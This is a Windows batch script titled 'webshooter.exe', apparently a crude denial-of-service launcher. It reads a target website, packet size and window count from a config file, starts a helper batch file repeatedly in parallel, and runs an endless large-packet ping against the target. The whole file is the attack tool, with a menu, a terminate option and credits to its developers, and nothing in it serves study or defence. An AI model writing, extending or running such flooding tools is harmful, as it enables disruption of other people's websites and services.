@echo off
title webshooter.exe
color A
setlocal enabledelayedexpansion
set count=0
for /f "tokens=*" %%x in (config.txt) do (
    set /a count+=1
    set var[!count!]=%%x
)
:select                                         
Echo [1] run shooter   [4] terminate shooter
Echo [2] check config  [5] check website ping
Echo [3] check shooter [6] help
Echo [7] credit	  [8] exit
set /p select=Select :
if %select% == 1 goto run
if %select% == 4 goto ter
if %select% == 8 goto exit
if %select% == 6 goto help
if %select% == 2 goto hconfig
if %select% == 5 goto hping
if %select% == 3 goto hcheck
if %select% == 7 goto credit
cls
goto select
:credit
cls
echo [+] grant#5476 Developer
echo [+] Sayonara#4212  Tester
echo [+] FIFAx2#7472 Tester
pause
cls
goto select
:run
cls
setlocal enabledelayedexpansion
set count=0
for /f "tokens=*" %%x in (config.txt) do (
    set /a count+=1
    set var[!count!]=%%x
)
set loopcount= %var[3]%
:loop
start dll.bat
echo start dll.bat
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop
:exitloop
pause
cls
goto select
:ter
start terminate.bat
cls
goto select
:exit
exit

:help
cls
Echo How to use config
Echo Line 1 Website
Echo Line 2 bytes
Echo Line 3 Amount Cmd
pause
cls
goto select
:hconfig
cls
echo website l %var[1]%
echo bytes   l %var[2]%
echo cmd     l %var[3]%
pause
cls
goto select
:hping
cls
ping %var[1]%
pause
cls
goto select
:hcheck
cls
ping -t -l %var[2]% %var[1]%
cls
goto select